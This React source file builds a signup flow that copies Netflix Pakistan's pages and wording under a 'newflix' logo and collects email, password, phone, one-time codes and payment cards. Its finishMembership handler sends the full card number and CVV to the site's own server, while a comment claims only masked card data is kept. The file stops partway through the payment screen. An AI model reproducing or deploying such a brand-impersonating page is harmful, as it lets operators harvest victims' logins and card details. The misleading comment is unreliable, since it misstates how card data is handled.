import { useEffect, useRef, useState } from 'react';
import { Link, useNavigate, useSearchParams } from 'react-router-dom';
import { API } from '../api';
import { useAuth } from '../context/AuthContext';
import useBranding from '../hooks/useBranding';
import { getCountries, getCountryCallingCode, parsePhoneNumberFromString } from 'libphonenumber-js';
import FieldError from '../components/FieldError';
import { footerEntry } from '../components/CookiePreferencesLink';

const signupCountries = getCountries().map((country) => ({ country, code: `+${getCountryCallingCode(country)}` }));
const signupFlag = (country) => String.fromCodePoint(...country.split('').map((char) => 127397 + char.charCodeAt(0)));

// Netflix Pakistan plan table (netflix.com/pk/signup exact copy)
const PLANS = [
  {
    id: 'mobile', name: 'Mobile', quality: '480p', price: 'PKR 250', qualityLabel: 'Fair',
    resolution: '480p', devices: 'Mobile phone, tablet', sameTime: '1', downloads: '1',
    header: 'linear-gradient(135deg,#0a3d91 0%,#0d5edb 100%)',
  },
  {
    id: 'basic', name: 'Basic', quality: '720p', price: 'PKR 450', qualityLabel: 'Good',
    resolution: '720p (HD)', devices: 'TV, computer, mobile phone, tablet', sameTime: '1', downloads: '1',
    header: 'linear-gradient(135deg,#1d3fa0 0%,#4d43c8 100%)',
  },
  {
    id: 'standard', name: 'Standard', quality: '1080p', price: 'PKR 800', qualityLabel: 'Great',
    resolution: '1080p (Full HD)', devices: 'TV, computer, mobile phone, tablet', sameTime: '2', downloads: '2',
    header: 'linear-gradient(135deg,#3f2fb0 0%,#a030b8 100%)',
  },
  {
    id: 'premium', name: 'Premium', quality: '4K + HDR', price: 'PKR 1,100', qualityLabel: 'Best',
    resolution: '4K (Ultra HD) + HDR', devices: 'TV, computer, mobile phone, tablet', sameTime: '4', downloads: '6',
    header: 'linear-gradient(110deg,#1e347f 0%,#6f236c 58%,#b40d3b 100%)', popular: true, spatial: true,
  },
];

// Reference footer order (row-major, 4 columns then a second row)
const FOOTER_LINKS = [
  ['FAQ', '/p/faq'], ['Help Center', '/p/help-center'], ['Terms of Use', '/p/terms'], ['Privacy', '/p/privacy'],
  ['Cookie Preferences', '/p/cookie-preferences'], ['Corporate Information', '/p/corporate-information'],
];

const emailOk = (v) => /^\S+@\S+\.\S+$/.test(v);

function ButtonLabel({ loading, children }) {
  return loading ? <><span className="nx-btn-spinner" aria-hidden="true" /> <span>Loading...</span></> : children;
}

// The upgrade reward is drawn as SVG so the lid, glow and sparkles can be
// animated independently. The public-folder images used elsewhere in signup
// (Picture1–Picture4) are different illustrations and must not be used here.
function UpgradeChest({ opening = false }) {
  return (
    <svg
      className={`nx-offer-chest ${opening ? 'is-opening' : 'is-open'}`}
      viewBox="0 0 180 180"
      role="img"
      aria-label={opening ? 'Opening your Premium upgrade' : 'Premium upgrade chest'}
    >
      <defs>
        <linearGradient id="nxChestBody" x1="32" y1="86" x2="150" y2="158" gradientUnits="userSpaceOnUse">
          <stop stopColor="#5424E8" />
          <stop offset="0.5" stopColor="#B22DCE" />
          <stop offset="1" stopColor="#FF3E86" />
        </linearGradient>
        <linearGradient id="nxChestLid" x1="37" y1="30" x2="148" y2="95" gradientUnits="userSpaceOnUse">
          <stop stopColor="#7130F4" />
          <stop offset="0.52" stopColor="#D13BCB" />
          <stop offset="1" stopColor="#FF416C" />
        </linearGradient>
        <linearGradient id="nxChestRim" x1="31" y1="75" x2="151" y2="100" gradientUnits="userSpaceOnUse">
          <stop stopColor="#4019B8" />
          <stop offset="0.52" stopColor="#8C22C1" />
          <stop offset="1" stopColor="#ED285F" />
        </linearGradient>
        <linearGradient id="nxChestLock" x1="76" y1="108" x2="106" y2="140" gradientUnits="userSpaceOnUse">
          <stop stopColor="#FF9AD9" />
          <stop offset="0.5" stopColor="#F04CBD" />
          <stop offset="1" stopColor="#B42DCE" />
        </linearGradient>
        <radialGradient id="nxChestAura">
          <stop offset="0" stopColor="#FF4FA3" stopOpacity="0.75" />
          <stop offset="0.45" stopColor="#D43BD3" stopOpacity="0.24" />
          <stop offset="1" stopColor="#D43BD3" stopOpacity="0" />
        </radialGradient>
        <filter id="nxChestShadow" x="-30%" y="-30%" width="160%" height="180%">
          <feDropShadow dx="0" dy="7" stdDeviation="7" floodColor="#7517A8" floodOpacity="0.28" />
        </filter>
        <filter id="nxChestSparkGlow" x="-120%" y="-120%" width="340%" height="340%">
          <feGaussianBlur stdDeviation="2.6" result="blur" />
          <feMerge><feMergeNode in="blur" /><feMergeNode in="SourceGraphic" /></feMerge>
        </filter>
      </defs>

      <ellipse className="nx-chest-aura" cx="90" cy="103" rx="78" ry="66" fill="url(#nxChestAura)" />
      <g className="nx-chest-sparkles" fill="#fff" filter="url(#nxChestSparkGlow)">
        <path d="M48 47c1.7 5.2 2.4 6 7.5 7.7-5.1 1.6-5.8 2.4-7.5 7.7-1.6-5.3-2.3-6.1-7.4-7.7 5.1-1.7 5.8-2.5 7.4-7.7Z" />
        <path d="M132 50c1.3 4 1.9 4.7 5.8 6-3.9 1.3-4.5 2-5.8 6-1.3-4-1.8-4.7-5.7-6 3.9-1.3 4.4-2 5.7-6Z" />
        <path d="M35 83c1 3.1 1.4 3.6 4.5 4.7-3.1 1-3.5 1.5-4.5 4.6-1-3.1-1.4-1.6-4.5-4.6 3.1-1.1 3.5-1.6 4.5-4.7Z" />
        <path d="M143 88c1.2 3.6 1.7 4.1 5.2 5.3-3.5 1.2-4 1.7-5.2 5.3-1.1-3.6-1.6-4.1-5.1-5.3 3.5-1.2 4-1.7 5.1-5.3Z" />
      </g>

      <g className="nx-chest-box" filter="url(#nxChestShadow)">
        <path
          d="M30 88c0-4.4 3.6-8 8-8h104c4.4 0 8 3.6 8 8l-3.2 60.2c-.4 7.1-6.2 12.8-13.3 12.8H46.5c-7.1 0-12.9-5.7-13.3-12.8L30 88Z"
          fill="url(#nxChestBody)"
        />
        <path d="M35 94h110l-.8 15.2H35.8L35 94Z" fill="#fff" fillOpacity="0.1" />
        <path d="M42 101h96" stroke="#FFB5E5" strokeOpacity="0.22" strokeWidth="2" />
        <path d="M43 151.8h94" stroke="#FFD5EF" strokeOpacity="0.24" strokeWidth="2" strokeLinecap="round" />

        <g className="nx-chest-lid">
          <path
            d="M30 78c1.7-28.2 18.5-48.5 43.2-51.9l33.6 3.4C132.1 33 149 52.3 150 78l-2.5 14.5h-115L30 78Z"
            fill="url(#nxChestLid)"
          />
          <path d="M30 77.5h120l-2.1 15H32.1l-2.1-15Z" fill="url(#nxChestRim)" />
          <path d="M37 69.5c5.4-20.8 18.8-33.4 36.4-36.7" fill="none" stroke="#E9B3FF" strokeOpacity="0.48" strokeWidth="5" strokeLinecap="round" />
          <ellipse cx="88" cy="43" rx="15" ry="10" fill="#FFBCE7" fillOpacity="0.38" />
        </g>

        <g className="nx-chest-lock">
          <rect x="75" y="109" width="30" height="31" rx="8" fill="url(#nxChestLock)" />
          <circle cx="90" cy="119" r="4.1" fill="#63208E" />
          <path d="M90 121v9" stroke="#63208E" strokeWidth="4" strokeLinecap="round" />
          <path d="M79 113.5c3-2.4 6.3-3.5 11-3.5" fill="none" stroke="#FFD5F0" strokeOpacity="0.55" strokeWidth="2" strokeLinecap="round" />
        </g>
      </g>
    </svg>
  );
}

// Step indicator mapping — single source of truth so the "Step X of 3" label
// always matches the page being shown (never hardcoded per block).
const STEP_NUM = {
  sendlink: 1, password: 1, code: 1, inbox: 1, 'plan-intro': 2, // Step 1/2 — account setup and plan selection
  plan: 2, upgrade: 2,                                           // Step 2 — plan (Netflix: "Step 2 of 3")
  pay: 3, card: 3,                                               // Step 3 — payment
};

// Steps a signed-in user can resume from after leaving mid-signup — the
// "Finish Sign-Up" landing drops them back at exactly this step.
const RESUME_STEPS = ['plan-intro', 'plan', 'upgrade', 'pay', 'card'];

// Screens the sign-up email can deep-link into (also handy for demos):
// Netflix's "Create a password" and "Enter the code we just sent".
const START_STEPS = ['password', 'code'];

// Real Netflix signup indicator: "Step N of 3" text + 3-segment progress bar.
// `plain` renders only the text (the Account Created screen shows no bars).
function StepIndicator({ step, plain }) {
  const n = STEP_NUM[step] || 0;
  if (!n) return null;
  return (
    <div className={`nx-step-ind ${plain ? 'nx-step-ind-plain' : ''}`}>
      <span className="nx-step-ind-label">Step {n} of 3</span>
      {!plain && (
        <div className="nx-step-ind-bar">
          {[1, 2, 3].map((s) => <i key={s} className={s <= n ? 'on' : ''} />)}
        </div>
      )}
    </div>
  );
}

export default function Signup() {
  const [params] = useSearchParams();
  const initialEmail = params.get('email') || '';
  const initialOtp = params.get('otp') || '';
  const initialStep = params.get('step') || '';   // the emailed link drops straight onto "Create a password"
  const resumePlanIntro = params.get('resume') === 'plan-intro';
  const hasEmailParam = Boolean(initialEmail);
  const startAtLink = START_STEPS.includes(initialStep);
  const startAtUpgrade = initialStep === 'upgrade';
  const [step, setStep] = useState(resumePlanIntro ? 'plan-intro' : startAtLink || startAtUpgrade ? initialStep : 'sendlink'); // sendlink → inbox → password → code → plan-intro → plan → upgrade → pay → card
  const [email, setEmail] = useState(initialEmail);
  const otpRefs = useRef([]);
  const [phoneCountry, setPhoneCountry] = useState('PK');
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [showPass, setShowPass] = useState(false);
  const [noOffers, setNoOffers] = useState(false);
  const [otp, setOtp] = useState('');
  const [plan, setPlan] = useState(startAtUpgrade ? PLANS[2] : PLANS[3]); // direct upgrade preview resumes at Standard; the real plan picker controls the user's choice
  const [card, setCard] = useState({ number: '', expiry: '', cvv: '', name: '' });
  const [agree, setAgree] = useState(false);
  const [cardErrors, setCardErrors] = useState({});
  const [error, setError] = useState('');
  const [info, setInfo] = useState('');
  const [busy, setBusy] = useState(false);
  const [loadingAction, setLoadingAction] = useState(false);
  const [showUpgradeOffer, setShowUpgradeOffer] = useState(false);
  const upgradeRevealTimer = useRef(null);
  const { login, loadMe, user, logout } = useAuth();
  const branding = useBranding();
  const nav = useNavigate();
  const logo = '/newflix.png';

  const normalizedPhone = () => {
    const raw = phone.trim();
    if (!raw) return null;
    const value = raw.startsWith('+') ? raw : `+${getCountryCallingCode(phoneCountry)}${raw.replace(/\D/g, '')}`;
    const parsed = parsePhoneNumberFromString(value);
    return parsed?.isValid() ? parsed.number : null;
  };

  useEffect(() => {
    // Netflix order for a new user: "Finish setting up your account" opens
    // first — the link is only emailed when they press Send Link.
    if (resumePlanIntro) { setStep('plan-intro'); return; }
    if (startAtLink || startAtUpgrade) { setStep(initialStep); return; }   // email/direct demo links
    if (initialEmail && !initialOtp) setStep('sendlink');
    // A link that carries its own one-time code is redeemed by the mail-link
    // handler (/finish-signup) — the same path the real email's button takes — so
    // there is never a second, dead-end copy of the sign-up screens.
    if (initialOtp) nav(`/finish-signup?email=${encodeURIComponent(initialEmail)}&otp=${encodeURIComponent(initialOtp)}`, { replace: true });
  }, [initialEmail, initialOtp, initialStep, resumePlanIntro, startAtUpgrade]);

  // ---- Mid-signup resume: the "Finish Sign-Up" page sends the user here ----
  // A signed-in user who left before paying continues at the exact step/plan
  // they left (server-persisted, localStorage as fallback).
  const restoredRef = useRef(false);
  useEffect(() => {
    if (restoredRef.current || !user || user.membershipActive) return;
    restoredRef.current = true;
    if (resumePlanIntro || hasEmailParam || initialOtp) return; // an explicit resume or email-link restart wins
    if (step !== 'sendlink') return;         // never interrupt an in-flight signup
    // Account already exists (signed in) → continue at the saved step, or the
    // plan step when nothing was saved yet.
    const savedStep = user.signupStep || localStorage.getItem('sf_signup_step');
    setStep(RESUME_STEPS.includes(savedStep) ? savedStep : 'plan-intro');
    const savedPlan = PLANS.find((p) => p.id === (user.signupPlan || localStorage.getItem('sf_signup_plan')));
    if (savedPlan) setPlan(savedPlan);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [user?.id]);

  // Persist progress (browser + server) so the resume page knows where to continue
  useEffect(() => {
    if (user?.membershipActive) {
      // Membership finished — resume state is no longer needed
      localStorage.removeItem('sf_signup_step');
      localStorage.removeItem('sf_signup_plan');
      return;
    }
    if (!RESUME_STEPS.includes(step)) return;
    try {
      localStorage.setItem('sf_signup_step', step);
      localStorage.setItem('sf_signup_plan', plan.id);
    } catch { /* storage unavailable */ }
    if (user) API.put('/user/signup-progress', { step, plan: plan.id }).catch(() => {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step, plan?.id, user?.membershipActive]);

  // Play the reward-opening sequence every time the real upgrade step is
  // entered. It only delays presentation; plan selection and payment handlers
  // remain unchanged. Reduced-motion users go straight to the offer.
  useEffect(() => {
    window.clearTimeout(upgradeRevealTimer.current);
    if (step !== 'upgrade') {
      setShowUpgradeOffer(false);
      return undefined;
    }
    setShowUpgradeOffer(false);
    const reduceMotion = window.matchMedia?.('(prefers-reduced-motion: reduce)').matches;
    upgradeRevealTimer.current = window.setTimeout(() => setShowUpgradeOffer(true), reduceMotion ? 80 : 3200);
    return () => window.clearTimeout(upgradeRevealTimer.current);
  }, [step]);

  const sendOtp = async (next = 'inbox', delivery = 'code') => {
    setError(''); setBusy(true);
    try {
      await API.post('/auth/send-otp', { email: email.trim(), purpose: 'signup', delivery });
      setStep(next);
    } catch (err) {
      setError(err.response?.data?.message || 'Failed to send the link. Please try again.');
    } finally { setBusy(false); }
  };

  // `mode` is 'code' on the OTP screen and 'link' everywhere else. Guarded so the
  // bare `onClick={resendOtp}` call sites (which pass the click event) stay safe.
  const resendOtp = async (mode) => {
    const delivery = mode === 'code' ? 'code' : 'link';
    setError(''); setBusy(true);
    try {
      await API.post('/auth/send-otp', { email: email.trim(), purpose: 'signup', delivery });
      setInfo(delivery === 'code' ? 'A new code has been sent to your email.' : 'A new sign-up link has been sent to your email.');
    } catch (err) {
      setError(err.response?.data?.message || 'Failed to resend. Please try again.');
    } finally { setBusy(false); }
  };

  // ---- Netflix "Enter the code we just sent" boxes (6 single-digit inputs) ----
  // The code is kept as one dense string, so the boxes always fill left to right
  // and the Submit button unlocks exactly when 6 digits are in.
  const setOtpBox = (i, raw) => {
    const digits = raw.replace(/\D/g, '');
    let next;
    if (digits.length > 1) next = otp.slice(0, i) + digits;                 // pasted into a box
    else if (i < otp.length) next = otp.slice(0, i) + digits + otp.slice(i + 1); // re-typing a box
    else next = otp + digits;
    next = next.replace(/\D/g, '').slice(0, 6);
    setOtp(next);
    if (raw !== '') otpRefs.current[Math.min(i + Math.max(digits.length, 1), 5)]?.focus();
  };

  const otpKey = (i, e) => {
    if (e.key === 'Backspace') {
      if (!otp[i] && i > 0) { e.preventDefault(); otpRefs.current[i - 1]?.focus(); }
      return;
    }
    if (e.key === 'ArrowLeft' && i > 0) otpRefs.current[i - 1]?.focus();
    if (e.key === 'ArrowRight' && i < 5) otpRefs.current[i + 1]?.focus();
  };

  const otpPaste = (i, e) => {
    const text = (e.clipboardData?.getData('text') || '').replace(/\D/g, '');
    if (!text) return;
    e.preventDefault();
    setOtp((otp.slice(0, i) + text).replace(/\D/g, '').slice(0, 6));
    otpRefs.current[Math.min(i + text.length, 5)]?.focus();
  };

  // Netflix nav: "Sign Out" really signs the mid-signup user out
  const signOutNow = async () => {
    await logout().catch(() => {});
    nav('/logout', { replace: true });
  };

  // Verify OTP + create the account (POST /api/auth/signup)
  const createAccount = async () => {
    setError(''); setBusy(true);
    try {
      const { data } = await API.post('/auth/signup', {
        name: email.split('@')[0], email: email.trim(), phone: normalizedPhone(), password, otp,
      });
      login(data.accessToken, data.user);
      setStep('plan-intro');
    } catch (err) {
      setError(err.response?.data?.message || 'Verification failed. Please check the code.');
    } finally { setBusy(false); }
  };

  const finishMembership = async () => {
    // Demo gateway (no real charges) — a payment record with ONLY masked card
    // data (brand + last 4) is saved and shown in the admin Payments ledger.
    setBusy(true);
    try {
      const digits = card.number.replace(/\s/g, '');
      const brand = /^4/.test(digits) ? 'Visa' : /^(5[1-5]|2[2-7])/.test(digits) ? 'Mastercard'
        : /^3[47]/.test(digits) ? 'Amex' : /^6/.test(digits) ? 'Discover' : 'Unknown';
      const { data } = await API.post('/user/payments', {
        plan: plan.name,
        planQuality: plan.quality,
        amount: Number(plan.price.replace(/[^\d.]/g, '')) || 0,
        currency: 'PKR',
        method: 'card',
        card: { number: digits, expiry: card.expiry, cvv: card.cvv, name: card.name, brand },
      });
      localStorage.setItem('sf_last_payment', data.payment.recordId);
      // Signup is complete — clear resume state, refresh the auth context so
      // protected routes accept the user, then pick a profile (Netflix flow).
      localStorage.removeItem('sf_signup_step');
      localStorage.removeItem('sf_signup_plan');
      await loadMe();
      // Membership started → Netflix's step-by-step "Simple setup" screens
      // (verify card → welcome → devices → who's watching → …) before /browse.
      nav('/onboarding');
    } catch (err) {
      setError(err.response?.data?.message || 'Payment could not be recorded. Please try again.');
    } finally { setBusy(false); }
  };

  const goToStep = (next) => {
    if (busy || loadingAction) return;
    setLoadingAction(true);
    window.setTimeout(() => {
      setStep(next);
      setLoadingAction(false);
    }, 260);
  };

  const goBack = () => {
    if (busy || loadingAction) return;
    const previousStep = {
      inbox: 'sendlink',
      password: 'sendlink',
      code: 'password',
      plan: 'plan-intro',
      upgrade: 'plan',
      pay: 'upgrade',
      card: 'pay',
    }[step];
    if (previousStep) {
      goToStep(previousStep);
      return;
    }
    if (step === 'plan-intro') {
      nav('/');
      return;
    }
    if (window.history.state?.idx > 0) nav(-1);
    else nav('/');
  };


  const fmtCard = (v) => v.replace(/\D/g, '').slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ');
  const fmtExpiry = (v) => {
    const d = v.replace(/\D/g, '').slice(0, 4);
    return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
  };

  const helpBlock = (
    <div className="nx-signup-footer">
      <p>Questions? <Link to="/p/contact">Contact us.</Link></p>
      <div className="nx-signup-footer-links">
        {FOOTER_LINKS.map(([label, to]) => footerEntry(label, to))}
      </div>
      {step !== 'inbox' && <p className="nx-captcha-note">This page is protected by Google reCAPTCHA to ensure you're not a bot.</p>}
    </div>
  );

  const signedIn = ['plan-intro', 'plan', 'upgrade', 'pay', 'card'].includes(step);

  return (
    <div className={`nx-signup ${step === 'plan' ? 'nx-signup-plan' : ''}`}>
      <header className="nx-signup-nav">
        <Link to="/"><img className="nx-logo nx-logo-sm" src={logo} alt={branding.siteName} /></Link>
        <div className="nx-signup-nav-actions">
          {step !== 'sendlink' && (
            <button type="button" className="nx-signup-nav-link nx-signup-back" onClick={goBack} disabled={busy || loadingAction}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="m15 18-6-6 6-6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /></svg>
              Back
            </button>
          )}
          {signedIn ? (
            <button type="button" className="nx-signup-nav-link" onClick={signOutNow}>Sign Out</button>
          ) : (
            <Link to="/login" className="nx-signup-nav-link">Sign In</Link>
          )}
        </div>
      </header>

      {error && (
        <div className="nx-auth-error nx-auth-error-inline" role="alert">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#fff" strokeWidth="1.8"/><path d="M12 7.5v6M12 16.5v.5" stroke="#fff" strokeWidth="2" strokeLinecap="round"/></svg>
          <span>{error}</span>
        </div>
      )}

      {/* ============ STEP 1 of 3 — finish setting up your account ============ */}
      {step === 'sendlink' && (
        <main className="nx-signup-main">
          <img className="nx-devices-ico" src="/AAAAQIL3Poat96BIA7iKG_OciW0moFDNCGgZjfNTYH91d1RH5UzL8KA4358scHfhBA.png" alt="" />
          <StepIndicator step={step} />
          <h1>Finish setting up your account</h1>
          {hasEmailParam ? (
            <p className="nx-signup-sub">We'll send a sign-up link to <b>{email}</b> so you can use Netflix without a password on any device at any time.</p>
          ) : (
            <p className="nx-signup-sub">Enter your email and we'll send a sign-up link so you can use Netflix without a password on any device at any time.</p>
          )}
          <form onSubmit={(e) => { e.preventDefault(); if (!emailOk(email)) { setError('Please enter a valid email address.'); return; } sendOtp('inbox', 'link'); }}>
            {!hasEmailParam && (
              <div className={`nx-infield nx-infield-light ${email ? 'has-value' : ''} ${emailOk(email) ? 'is-valid' : ''}`}>
                <label>Email</label>
                <input type="email" placeholder=" " value={email} onChange={(e) => setEmail(e.target.value)} required />
              </div>
            )}
            <label className="nx-remember nx-offers">
              <input type="checkbox" checked={noOffers} onChange={(e) => setNoOffers(e.target.checked)} />
              Please do not email me Netflix special offers.
            </label>
            <button className="nx-btn-continue" disabled={busy}><ButtonLabel loading={busy}>Send Link</ButtonLabel></button>
          </form>
        </main>
      )}

      {/* ============ STEP 1 of 3 — create a password ============ */}
      {step === 'password' && (
        <main className="nx-signup-main nx-signup-password-main">
          <StepIndicator step={step} plain />
          <h1>Create a password to start your membership</h1>
          <p className="nx-signup-sub">Just a few more steps and you're done!<br />We hate paperwork, too.</p>
          <form onSubmit={(e) => { e.preventDefault(); if (!emailOk(email)) { setError('Please enter a valid email address.'); return; } if (password.length < 8) { setError('Your password must contain between 8 and 60 characters.'); return; } sendOtp('code'); }}>
            <div className={`nx-infield nx-infield-light ${email ? 'has-value' : ''} ${emailOk(email) ? 'is-valid' : ''}`}>
              <label>Email</label>
              <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} required />
            </div>
            <div className={`nx-infield nx-infield-light ${password ? 'has-value' : ''}`}>
              <label>Password</label>
              <input type={showPass ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} minLength={8} maxLength={60} required />
            </div>
            <label className="nx-remember nx-offers">
              <input type="checkbox" checked={noOffers} onChange={(e) => setNoOffers(e.target.checked)} />
              Please do not email me Netflix special offers.
            </label>
            <button className="nx-btn-continue" disabled={busy}><ButtonLabel loading={busy}>Next</ButtonLabel></button>
          </form>
        </main>
      )}

      {/* ============ STEP 1 of 3 — check your inbox ============ */}
      {step === 'inbox' && (
        <main className="nx-signup-inbox">
          <div className="nx-signup-inbox-col">
            <img className="nx-inbox-ico" src="/AAAAQAmpros-eVHttd-jyVbIiMTW885cisEwMOLTGkTzHQifWIkevLiCu24tEsptsw.png?v=3" alt="" />
            <StepIndicator step={step} plain />
            <h1>Check your inbox</h1>
            <p className="nx-signup-inbox-sub">
              We sent a sign-up link to <b>{email}</b>. Tap the link in the email to finish setting up your account.
            </p>
            {info && <p className="nx-inbox-info">{info}</p>}
            <button type="button" className="nx-btn-continue" onClick={resendOtp} disabled={busy}><ButtonLabel loading={busy}>Resend Link</ButtonLabel></button>
            <button type="button" className="nx-btn-gray-full" onClick={() => { setError(''); setInfo(''); goToStep('password'); }} disabled={loadingAction}><ButtonLabel loading={loadingAction}>Create Password Instead</ButtonLabel></button>
          </div>
        </main>
      )}

      {/* ============ STEP 1 of 3 — "Enter the code we just sent" (Netflix exact) ============ */}
      {step === 'code' && (
        <main className="nx-signup-main nx-otp">
          <StepIndicator step={step} />
          <h1>Enter the code we just sent</h1>
          <p className="nx-signup-sub">
            Please enter the code we sent to <b>{email}</b> to help us protect your account.
            The code will expire 10 minutes after it&apos;s sent.
          </p>
          {info && <div className="nx-auth-success">{info}</div>}
          <form onSubmit={(e) => {
            e.preventDefault();
            if (otp.length !== 6) { setError('Please enter all 6 digits of the code we sent you.'); return; }
            createAccount();
          }}>
            <div className="nx-otp-boxes">
              {[0, 1, 2, 3, 4, 5].map((i) => (
                <input
                  key={i}
                  ref={(el) => { otpRefs.current[i] = el; }}
                  className="nx-otp-box"
                  type="text"
                  inputMode="numeric"
                  autoComplete={i === 0 ? 'one-time-code' : 'off'}
                  autoFocus={i === 0}
                  maxLength={1}
                  value={otp[i] || ''}
                  aria-label={`Code digit ${i + 1}`}
                  onChange={(e) => setOtpBox(i, e.target.value)}
                  onKeyDown={(e) => otpKey(i, e)}
                  onPaste={(e) => otpPaste(i, e)}
                />
              ))}
            </div>
            <button className="nx-btn-submit" disabled={busy || loadingAction}>
              <ButtonLabel loading={busy}>Submit</ButtonLabel>
            </button>
          </form>
          <button className="nx-btn-gray-full" onClick={() => resendOtp('code')} disabled={busy}>
            <ButtonLabel loading={busy}>Resend Code</ButtonLabel>
          </button>
          <p className="nx-otp-help">Need help? <Link to="/p/help-center">Visit the Help Center</Link></p>
        </main>
      )}

      {/* ============ STEP 2 of 3 — choose a plan introduction ============ */}
      {step === 'plan-intro' && (
        <main className="nx-signup-main nx-plan-intro-main">
          <div className="nx-plan-intro-check" aria-hidden="true">
            <svg width="42" height="42" viewBox="0 0 42 42" fill="none">
              <circle cx="21" cy="21" r="19" stroke="#e50914" strokeWidth="2" />
              <path d="m12 21 6 6 12-13" stroke="#e50914" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </div>
          <StepIndicator step={step} plain />
          <h1>Choose your plan</h1>
          <ul className="nx-plan-intro-benefits">
            <li>No commitments, cancel anytime.</li>
            <li>Everything on Netflix for one low price.</li>
            <li>No ads and no extra fees. Ever.</li>
          </ul>
          <button className="nx-btn-continue" onClick={() => { setPlan(PLANS[3]); goToStep('plan'); }} disabled={loadingAction}><ButtonLabel loading={loadingAction}>Next</ButtonLabel></button>
        </main>
      )}

      {/* ============ STEP 2 of 3 — plan picker ============ */}
      {step === 'plan' && (
        <main className="nx-signup-plan-main">
          <StepIndicator step={step} plain />
          <h1>Choose the plan that's right for you</h1>
          <div className="nx-plan-grid">
            {PLANS.map((p) => (
              <button
                type="button"
                key={p.id}
                className={`nx-plan-card ${plan.id === p.id ? 'selected' : ''} ${p.popular ? 'popular' : ''}`}
                aria-pressed={plan.id === p.id}
                onClick={() => setPlan(p)}
              >
                {p.popular && <span className="nx-plan-popular">Most Popular</span>}
                <span className="nx-plan-head" style={{ background: p.header }}>
                  <b>{p.name}</b>
                  <i>{p.quality}</i>
                  {plan.id === p.id && (
                    <svg className="nx-plan-check" width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true"><circle cx="12" cy="12" r="10" fill="#fff"/><path d="M8 12.5l3 3 5-6" stroke="#e50914" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                  )}
                </span>
                <span className="nx-plan-body">
                  <em>Monthly price</em><b>{p.price}</b>
                  <em>Video and sound quality</em><b>{p.qualityLabel}</b>
                  <em>Resolution</em><b>{p.resolution}</b>
                  {p.spatial && (<><em>Spatial audio (immersive sound)</em><b>Included</b></>)}
                  <em>Supported devices</em><b>{p.devices}</b>
                  <em>Devices your household can watch at the same time</em><b>{p.sameTime}</b>
                  <em>Download devices</em><b>{p.downloads}</b>
                </span>
              </button>
            ))}
          </div>
          <p className="nx-plan-fineprint">
            HD (720p), Full HD (1080p), Ultra HD (4K) and HDR availability subject to your internet service and device capabilities. Not all content is available in all resolutions. See our <Link to="/p/terms">Terms of Use</Link> for more details.
            <br />
            Only people who live with you may use your account. Watch on 4 different devices at the same time with Premium, 2 with Standard, and 1 with Basic and Mobile.
            <br />
            Live events are included with any Netflix plan and contain ads.
          </p>
          <button className="nx-btn-continue nx-plan-next" onClick={() => goToStep('upgrade')} disabled={loadingAction}><ButtonLabel loading={loadingAction}>Next</ButtonLabel></button>
        </main>
      )}

      {/* ============ STEP 2 of 3 — upgrade reward opening ============ */}
      {step === 'upgrade' && !showUpgradeOffer && (
        <main className="nx-offer-intro" aria-live="polite">
          <UpgradeChest opening />
          <h1>You're getting an upgrade —<br />on us!</h1>
        </main>
      )}

      {/* ============ STEP 2 of 3 — upgrade offer ============ */}
      {step === 'upgrade' && showUpgradeOffer && (
        <main className="nx-signup-main nx-offer-main">
          <UpgradeChest />
          <h1>You're getting an upgrade —<br />on us!</h1>
          <p className="nx-signup-sub">Start your first month of Netflix with Premium for the price of Standard.</p>
          <div className="nx-offer-card">
            <span className="nx-offer-badge">Upgrade offer</span>
            <p className="nx-offer-title">Premium</p>
            <p className="nx-offer-price"><s>{PLANS[3].price}</s><em>{PLANS[2].price}</em> <span>first month</span></p>
            <p className="nx-offer-renew">then auto-renews for {PLANS[3].price}/month</p>
            <ul className="nx-offer-ticks">
              {['4K + HDR video resolution', 'Spatial audio (no equipment needed)', '4 devices to watch at the same time'].map((benefit) => (
                <li key={benefit}>
                  <svg className="nx-offer-check" viewBox="0 0 18 18" fill="none" aria-hidden="true">
                    <path d="m3.2 9.1 3.7 3.7 8-8" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                  <span>{benefit}</span>
                </li>
              ))}
            </ul>
          </div>
          <p className="nx-offer-reminder">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="2.5" y="5" width="19" height="14" rx="2" stroke="currentColor" strokeWidth="1.7" /><path d="M3.5 7.5l8.5 5.5 8.5-5.5" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" /></svg>
            <span>We'll remind you 7 days before your offer ends.</span>
          </p>
          <button type="button" className="nx-btn-continue nx-btn-offer" onClick={() => { setPlan(PLANS[3]); goToStep('pay'); }} disabled={loadingAction}><ButtonLabel loading={loadingAction}>Try Premium</ButtonLabel></button>
          <button type="button" className="nx-btn-continue nx-btn-offer-keep" onClick={() => goToStep('pay')} disabled={loadingAction}><ButtonLabel loading={loadingAction}>Keep {plan.name}</ButtonLabel></button>
          <p className="nx-offer-note">Your Premium plan will continue after the first month at {PLANS[3].price} unless you cancel or change plans.</p>
        </main>
      )}

      {/* ============ STEP 3 of 3 — choose how to pay ============ */}
      {step === 'pay' && (
        <main className="nx-signup-main nx-signup-pay-main">
          <img className="nx-payment-ico" src="/Lock.png" alt="Secure payment" />
          <StepIndicator step={step} />
          <h1>Choose how to pay</h1>
          <p className="nx-signup-sub">Your payment is encrypted and you can change how you pay anytime.</p>
          <p className="nx-signup-strong">Secure for peace of mind.<br />Cancel easily online.</p>
          <div className="nx-pay-options">
